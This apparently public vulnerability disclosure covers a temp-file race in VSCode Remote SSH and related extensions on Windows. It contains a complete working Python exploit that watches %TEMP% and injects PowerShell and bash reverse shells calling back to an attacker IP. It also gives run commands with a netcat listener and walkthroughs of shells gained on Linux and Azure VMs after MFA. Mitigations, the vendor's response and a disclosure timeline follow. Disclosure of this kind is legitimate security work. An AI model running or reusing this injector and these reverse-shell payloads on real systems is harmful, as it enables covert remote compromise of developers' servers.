# VSCode Remote SSH — Setup Script Injection → RCE on Servers
 
> *"The attacker must first achieve arbitrary code execution as the victim user on the victim's Windows machine."*
>
> — Microsoft MSRC, closing case VULN-187877 with no CVE, no fix, no bounty.
 
---
 
## 76,788,374 Affected Installs
 
| Extension | Publisher | Installs |
|---|---|---|
| [Remote - SSH](https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-ssh) | Microsoft | 33,967,307 |
| [Remote Explorer](https://marketplace.visualstudio.com/items?itemName=ms-vscode.remote-explorer) | Microsoft | 25,420,353 |
| [Remote Development Pack](https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.vscode-remote-extensionpack) | Microsoft | 8,425,221 |
| [AWS Toolkit](https://marketplace.visualstudio.com/items?itemName=AmazonWebServices.aws-toolkit-vscode) | Amazon | 4,526,467 |
| [Azure Virtual Machines](https://marketplace.visualstudio.com/items?itemName=ms-azuretools.vscode-azurevirtualmachines) | Microsoft | 2,298,623 |
| [Azure Tools](https://marketplace.visualstudio.com/items?itemName=ms-vscode.vscode-node-azure-pack) | Microsoft | 2,150,403 |
 
> **Cursor IDE** runs these same VSCode extensions under the hood — 5M+ users, 1M+ daily active, used by 50%+ of Fortune 500 — extending the real-world attack surface significantly beyond this number.
 
All share the same root cause. Same temp directory. Same timing gap. Same missing integrity check.
 
---
 
## The Vulnerability
 
When you initiate a Remote SSH connection in VSCode, the extension writes a bootstrap shell script to your **local Windows temp directory** before authentication begins:
 
```
C:\Users\[user]\AppData\Local\Temp\vscode-linux-multi-line-command-[IP]-[RANDOM].sh
```
 
This script:
- Is created the moment you type a hostname and press Enter
- Sits in a directory every Windows user can write to — no elevation needed
- **Has no integrity check, no signature, no file lock**
- Is transmitted and executed on the **remote server** by VSCode immediately after your SSH session is established
An attacker running a standard Python script as the same Windows user can intercept, modify, and inject arbitrary code into this file in the window between creation and execution — which spans the entire authentication phase, including MFA.
 
---
 
## Attack Timeline
 
```
T+0ms      User enters hostname, presses Enter
T+~50ms    VSCode writes .sh file to %TEMP%
T+~50ms    Watcher detects file, payload injected (<10ms)
           ┌──────────────────────────────────────────────┐
           │   User authenticates — password, key, MFA    │
           │         (5 to 30+ second window)              │
           └──────────────────────────────────────────────┘
T+auth     SSH connection established
T+auth+δ   VSCode executes injected script on remote server
T+auth+δ   Reverse shell connects back
```
 
---
 
## Proof of Concept
 
### Prerequisites
 
- Python 3
- `pip install watchdog`
- Standard Windows user access (no admin, no elevation)
- A netcat listener: `nc -lvnp <PORT>`
### The Injector
 
```python
import time
import argparse
import os
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
 
class MyHandler(FileSystemEventHandler):
    def __init__(self, shared_list, ip, port):
        self.shared_list = shared_list
        self.ip = ip
        self.port = port
 
    def on_created(self, event):
        if not event.is_directory and event.src_path.endswith('.sh'):
            self.shared_list.append(event.src_path)
            print(f"New .sh file detected: {event.src_path}")
            self.modify_file(event.src_path)
            print("File modification completed.")
 
    def modify_file(self, file_path):
        try:
            with open(file_path, 'r', newline='\n') as file:
                lines = file.readlines()
 
            commandW = f"$powershell = [powershell]::Create().AddScript({{ $client = New-Object System.Net.Sockets.TCPClient('{self.ip}',{self.port}); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $reader = New-Object System.IO.StreamReader($stream); $writer.AutoFlush = $true; while ($true) {{ $command = $reader.ReadLine(); if ($command -eq 'exit') {{ break }}; try {{ $result = Invoke-Expression $command 2>&1 | Out-String }} catch {{ $result = $_.Exception.Message }}; $writer.WriteLine($result); $writer.WriteLine('PS ' + (pwd).Path + '> ') }}; $client.Close() }}); $powershell.BeginInvoke() | Out-Null;"
            commandL = f"bash -c 'bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1 &# shellcheck shell=sh'"
 
            windows_keywords = ['windows', 'window', 'Windows']
            linux_keywords = ['linux', 'Linux']
            windows_found = False
            linux_found = False
 
            for line in lines:
                if any(keyword in line for keyword in windows_keywords):
                    windows_found = True
                    break
                if any(keyword in line for keyword in linux_keywords):
                    linux_found = True
                    break
 
            if windows_found:
                lines.insert(0, commandW)
            elif linux_found:
                lines.insert(0, commandL)
            else:
                lines.insert(0, commandL)
                lines.insert(1, commandW)
 
            with open(file_path, 'w', newline='\n') as file:
                file.writelines(lines)
 
        except Exception as e:
            pass
 
def monitor_directory(path, sh_files, ip, port):
    event_handler = MyHandler(sh_files, ip, port)
    observer = Observer()
    observer.schedule(event_handler, path, recursive=False)
    print("Running...")
    observer.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--listen-ip", required=True)
    parser.add_argument("-p", "--listen-port", required=True, type=int)
    args = parser.parse_args()
    username = os.getlogin()
    path = f"C:\\Users\\{username}\\AppData\\Local\\Temp"
    sh_files = []
    monitor_directory(path, sh_files, args.listen_ip, args.listen_port)
```
 
### Run It
 
```bash
# On victim's Windows machine (same user session, no admin)
pip install watchdog
python exploit.py -i <ATTACKER_IP> -p <PORT>
 
# On attacker machine
nc -lvnp <PORT>
 
# Victim opens VSCode → Remote-SSH: Connect to Host → enters any server IP → authenticates
# Shell arrives on attacker listener post-auth
```
 
### OS Detection
 
The script reads VSCode's generated `.sh` file and checks for `windows` / `linux` keywords to automatically select the correct payload — PowerShell reverse shell for Windows targets, bash for Linux. If the OS cannot be determined, both payloads are injected. The attack works regardless of what the remote server is running.
 
---
 
## Walkthrough — Video 1: Remote SSH (Windows → Linux)
 
**File:** `VSCODE-1-12-05-2026.mkv`
 
**Setup:**
- Attacker's machine: Kali Linux (IP: 192.168.68.128), netcat listener running
- Victim's machine: Windows 11, Python watcher running as standard user
- Remote target: Kali Linux SSH server (IP: 192.168.68.132)
**What happens:**
1. Victim opens VSCode → `Remote-SSH: Connect to Host` → enters `192.168.68.132`
2. VSCode immediately creates in `%TEMP%`:
   `vscode-linux-multi-line-command-192.168.68.132-63244914.sh`
3. Watcher fires. Bash reverse shell payload injected in milliseconds.
4. Victim enters SSH password. Connection established.
5. VSCode executes the (now-injected) script on the remote server.
6. Attacker's listener receives shell. `echo "Attacker"` and `ifconfig` confirm execution context on the remote Linux machine.




---
 
## Walkthrough — Video 2: Azure Virtual Machines (MFA Bypassed)
 
**File:** `VSC-AZ.mkv`
 
**Setup:**
- Two real Azure VMs provisioned via the Azure Virtual Machines VSCode extension:
  `Attacker-Demo-POC` and `Victim-Machine-NEW`
- Python watcher running on Windows
- Victim initiates connection to `Victim-Machine-NEW` via the Azure VM extension
**What happens:**
1. Victim selects `Victim-Machine-NEW` in the Azure VM extension panel
2. VSCode creates bootstrap script in `%TEMP%`. Watcher injects payload.
3. Victim completes **Azure AD MFA** — full authentication flow, Microsoft Authenticator approval
4. VSCode establishes SSH connection and executes the injected script on `Victim-Machine-NEW`
5. Shell received. From inside:
```bash
victim@Victim-Machine-NEW:~$ whoami
victim
 
victim@Victim-Machine-NEW:~$ curl https://whatismyip.cc
Your IP: 20.235.100.125
Organization: Microsoft Corporation
```
 
Live Azure infrastructure. Post-MFA. Zero alerts. Connection looked completely normal to the victim.
 
---
 
## Why Every Defence Fails
 
| Defence | Why It Fails |
|---|---|
| **MFA** | Injected code runs *after* auth completes. MFA is satisfied before script executes. |
| **SSH Keys** | Auth-method agnostic. Doesn't matter how you authenticate. |
| **VPN / Private Network** | Shell calls out from the *remote server*. Outbound TCP is almost never blocked. |
| **Windows Defender / AV** | Python writing to a temp dir triggers no signatures. No shellcode, no injection. |
| **Azure Defender for Cloud** | Execution is indistinguishable from VSCode's own normal setup process. |
| **SIEM / Monitoring** | Runs under the legitimate authenticated user, in the same process window as VSCode setup. |
 
---
 
## Microsoft's Response
 
**Submitted:** May 13, 2026
**Case:** VULN-187877 / Case 116933
**Status:** Closed
 
> *"After careful investigation, this case does not meet Microsoft's bar for immediate servicing as, for the attack to occur, the attacker must first achieve arbitrary code execution as the victim user on the victim's Windows machine.*
>
> *Since this case was below the bar for immediate servicing, it is not eligible for bounty, and no CVE will be issued. MSRC will not be tracking this issue further."*
>
> — Eli, Microsoft Security Response Center

<img width="1906" height="970" alt="image" src="https://github.com/user-attachments/assets/1ec990ba-9228-45ec-816c-fc0559f7903e" />

 
Running Python as a normal Windows user — via phishing, a malicious VS Code marketplace extension, or 5 minutes of physical access — does not meet their bar for fixing a 33.9M-download extension that executes unsigned scripts on Azure VMs post-MFA.
 
---
 
## Mitigations
 
No patch exists. Until one does:
 
- Inspect `%AppData%\Local\Temp` for `.sh` files appearing at the moment of a Remote SSH connection attempt — that file should only contain VSCode bootstrap content
- Do not use VSCode Remote SSH on Windows machines where any untrusted process or user shares your session
- Use a dedicated Windows account exclusively for VSCode remote work
- Use a jump host — limit blast radius to the jump host rather than your full production fleet
- Monitor remote servers for unexpected outbound TCP connections in the 30-second window after a VSCode SSH session is established
**What the actual fix looks like:**
- Hash the bootstrap script at creation time, verify before remote execution
- Transmit in-memory over the SSH channel — never write to the local filesystem
- Hold an exclusive write lock between file creation and remote execution
---
 
## Disclosure Timeline
 
| Date | Event |
|---|---|
| May 12, 2026 | Vulnerability discovered. PoC developed and recorded. |
| May 13, 2026 | Full report + PoC videos submitted to Microsoft MSRC |
| May 13, 2026 | MSRC opened case VULN-187877 / Case 116933 |
| May 22, 2026 | MSRC closed case — no CVE, no fix, no bounty |
| May 23, 2026 | Full public disclosure |
 
---
 
## Author
 
**Suman Kumar Chakraborty**
 
---
